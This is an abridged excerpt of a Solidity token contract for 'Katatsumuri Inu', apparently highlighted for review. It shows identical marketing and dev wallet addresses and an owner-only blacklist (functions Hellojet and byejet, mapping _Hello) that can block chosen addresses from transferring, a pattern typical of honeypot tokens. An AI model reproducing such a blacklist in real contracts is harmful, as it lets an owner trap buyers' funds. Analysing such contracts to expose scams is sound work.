...
contract KatatsumuriInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xdEcc0b1444f778eF6ED4f94a5C9da639Fb9a2656); 
    address payable public Wallet_Dev = payable(0xdEcc0b1444f778eF6ED4f94a5C9da639Fb9a2656);
    ...
    string private constant _name = "Katatsumuri Inu"; 
    string private constant _symbol = unicode"KATATSUMURI"; 
    ...
    function _transfer(
		...
		require(!_Hello[from] && !_Hello[to], "This address is like a JET !");
	...
	function Hellojet(address[] calldata addresses) external onlyOwner 
	{
    ...
    function byejet(address account) external onlyOwner 
	{
